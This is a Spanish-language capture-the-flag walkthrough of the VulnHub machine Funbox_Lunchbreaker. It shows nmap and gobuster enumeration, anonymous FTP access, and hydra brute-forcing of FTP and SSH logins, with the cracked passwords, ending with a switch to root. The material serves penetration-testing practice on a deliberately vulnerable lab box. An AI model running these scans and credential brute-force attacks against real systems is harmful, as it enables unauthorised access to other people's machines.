---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Funbox\_Lunchbreaker VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 08:27 EDT
Nmap scan report for 192.168.5.195
Host is up (0.00023s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0             633 May 22  2021 supers3cr3t
|_drwxr-xr-x    6 1006     1006         4096 May 22  2021 wordpress
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.5.175
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1d:3d:bf:5a:e1:9f:bb:31:85:34:94:24:cf:0c:04:20 (RSA)
|   256 3b:e1:5c:97:5a:93:1d:9c:d5:02:e5:d8:15:a7:92:ea (ECDSA)
|_  256 d6:f2:e3:da:7e:d7:3f:94:7e:3b:5d:bc:ef:ee:49:63 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:6B:2C:00 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds
```

### ftp

```shell
ftp anonymous@<IP>
```

Encontraremos 2 archivos interesantes que nos descargaremos, a parte de un directorio `Wordpress`...

```shell
get .s3cr3t

get  supers3cr3t
```

Leeremos los 2...

> .s3cr3t

```
SWYgdGhlIHJhZGlhbmNlIG9mIGEgdGhvdXNhbmQgc3VucyAvIHdlcmUgdG8gYnVyc3QgYXQgb25jZSBpbnRvIHRoZSBza3kgLyB0aGF0IHdvdWxkIGJlIGxpa2UgLyB0aGUgc3BsZW5kb3Igb2YgdGhlIE1pZ2h0eSBPbmUgYW5kIEkgYW0gYmVjb21lIERlYXRoLCB0aGUgc2hhdHRlcmVyIG9mIHdvcmxkcw==
```

> supers3cr3t

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++++++.>+++++++++++..----.<<++.>>-------.+..+++++++++++.<<.>>-------.+++++.++++++.-----.<<.>>-.-------------.+++++++++++++++++++.+.---.-------------.<<.>>----.+++++++++++++.----------.<<.>>++++++++++++++++.------------.---.+++++++++.<<.>>+++++++++++.----------.++++++.<<.>>++.--------------.+++..<<.>>+++++++++.-------.----------.+.+++++++++++++.+.+.-------------------.+++++++++++++.----------.<<.>>+.+++++++++++++++++.-----------------.+++++++++++++.+++++++.-----.------------.+.+++++.-------.<<.>>-----.+++.+++++++++++++++..---------------.+++++++++++++.<<++++++++++++++.------------.
```

El primero esta codificado en `Base64` y el segundo en `Brainfuck` si lo decodificamos veremos lo siguiente...

> Decodificado .s3cr3t

```
If the radiance of a thousand suns / were to burst at once into the sky / that would be like / the splendor of the Mighty One and I am become Death, the shatterer of worlds
```

> Decodificado supers3cr3t

```
Look deep into nature and then you will understand everything better."
```

Dicen algunas pistas, pero nada interesante...

### Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt,md -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.195/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,md
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.md         (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htaccess.md         (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 379]
/robots.txt           (Status: 200) [Size: 46]
/robots.txt           (Status: 200) [Size: 46]
/server-status        (Status: 403) [Size: 278]
Progress: 102345 / 102350 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos un `robots.txt` bastante interesante, por lo que si lo leemos, veremos lo siguiente...

```
DISALLOW: dirb, gobuster, etc.
ALLOW: WYSIWYG
```

Si inspeccionamos la pagina principal del puerto `80`...

```html
<! webdesign by j.miller [jane@funbox8.ctf] >
```

Si probamos a tirar un `hydra` con ese nombre de usuario no encontraremos nada, pero si probamos con el `ftp` veremos lo siguiente...

```shell
hydra -l jane -P <WORDLIST> ftp://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-20 10:39:04
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://192.168.5.195:21/
[21][ftp] host: 192.168.5.195   login: jane   password: password
```

Con esto vemos que tenemos las credenciales de `jane` del `ftp`...

```shell
ftp jane@<IP>
```

Y si metemos la contarseña estaremos dentro...

Si listamos la `/home` de los usuarios, veremos varios usuarios, por lo que crearemos una lista de los usuarios, para ver si hay alguna contraseña mas por el `ftp`...

> users.txt

```
jane
jim
john
jules
```

Por lo que tiraremos un `hydra`...

```shell
hydra -L users.txt -P <WORDLIST> ftp://<IP> -t 64
```

Info:

```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-20 10:54:40
[DATA] max 64 tasks per 1 server, overall 64 tasks, 57377596 login tries (l:4/p:14344399), ~896525 tries per task
[DATA] attacking ftp://192.168.5.195:21/
[21][ftp] host: 192.168.5.195   login: jane   password: password
[21][ftp] host: 192.168.5.195   login: jim   password: 12345
```

Si nos metemos como el usuario `jim` y nos metemos por el `ftp` mediante ese usuario, veremos una carpeta llamada `.ssh/` pero no podremos hacer mucho...

Si vemos el `hydra` si descubrio mas usuarios, vemos que descubrio otro usuario mas, llamado `jules`...

```
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.5.195:22/
[STATUS] 366.00 tries/min, 366 tries in 00:01h, 14344059 to do in 653:12h, 38 active
[STATUS] 259.67 tries/min, 779 tries in 00:03h, 14343653 to do in 920:39h, 31 active
[22][ssh] host: 192.168.5.195   login: jules   password: sexylady
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 23 final worker threads did not complete until end.
[ERROR] 23 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-20 11:11:58
```

Por lo que inspeccionaremos con ese usuario...

Vemos que hay una carpeta llamada `.backups/` si nos metemos dentro solo habra 2 archivos llenos de diccionario de palabras, llamados `.good-passwd` y `.bad-passwds`, si probamos el archivo `.good-passwd` veremos que no encuentra nada, pero si probamos el archivo `.bad-passwds` veremos lo siguiente...

```shell
hydra -l john -P .bad-passwds ssh://<IP> -t 64
```

Info:

```
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344400 login tries (l:1/p:14344400), ~224132 tries per task
[DATA] attacking ssh://192.168.5.195:22/
[22][ssh] host: 192.168.5.195   login: john   password: zhnmju!!!
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 25 final worker threads did not complete until end.
[ERROR] 25 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-20 11:22:08
```

Por lo que nos conectaremos al `ssh`...

```shell
ssh john@<IP>
```

Metiendo la contraseña ya estaremos dentro, si dentro de la `/home` nos vamos a `.todo/` habra un archivo llamado `todo.list` si lo leemos veremos lo siguiente...

```
1. Install LAMP
2. Install MAIL-System
3. Install Firewall
4. Install Plesk
5. Chance R00TPASSWD, because it's the same right now.
```

Si probamos a cambiarnos a `root` con la siguiente contraseña `R00TPASSWD` veremos que nos cambiaremos a `root` y ya seremos `root`...

Una vez siendo `root` leeremos la flag...

> root.txt (flag\_final)

```
|~~          |           |              |    |              |         
|--|   ||/~\ |~~\/~\\/o  | |   ||/~\ /~~|/~\ |~~\|/~\/~//~~||_//~/|/~\
|   \_/||   ||__/\_//\o  |__\_/||   |\__|   ||__/|   \/_\__|| \\/_|   
                                                                    
created by @0815R2d2.

Congrats ! I look forward to see this on my twitter-account :-)
```
